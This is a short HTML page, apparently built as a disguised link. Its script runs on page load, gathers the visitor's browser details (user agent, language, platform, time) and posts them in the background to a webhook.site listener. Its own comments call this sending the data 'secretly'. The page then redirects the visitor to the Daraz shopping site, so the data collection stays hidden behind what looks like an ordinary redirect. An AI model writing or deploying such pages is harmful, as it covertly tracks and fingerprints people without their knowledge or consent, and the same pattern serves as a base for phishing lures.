<html>
<head>
    <script>
        const webhookUrl = "https://webhook.site/e34233f7-4754-4ed2-90f1-2322f3b1ac6a";
        
        // Capturing the user's browser info and sending it to our listener
        const data = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            timestamp: new Date().toISOString()
        };

        // Sending the data secretly in the background
        fetch(webhookUrl, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(data)
        });

        // Redirecting the user to Daraz
        window.location.replace("https://www.daraz.pk/");
    </script>
</head>
